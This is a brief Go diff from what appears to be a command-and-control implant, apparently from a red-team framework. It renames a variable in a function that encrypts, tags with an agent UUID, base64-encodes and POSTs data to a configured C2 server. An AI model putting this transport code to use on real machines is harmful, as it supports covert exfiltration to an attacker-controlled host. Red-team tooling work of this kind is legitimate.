@@ -298,7 +298,7 @@ func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
 
 //htmlPostData HTTP POST function
 func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
-	url := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
+	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
 	//log.Println("Sending POST request to url: ", url)
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.Key) != 0 {
@@ -307,7 +307,7 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	}
 	sendData = append([]byte(c.ApfellID), sendData...)             // Prepend the UUID
 	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
-	req, err := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
+	req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendData))
 	if err != nil {
 		//log.Printf("Error creating new http request: %s", err.Error())
 		return make([]byte, 0)
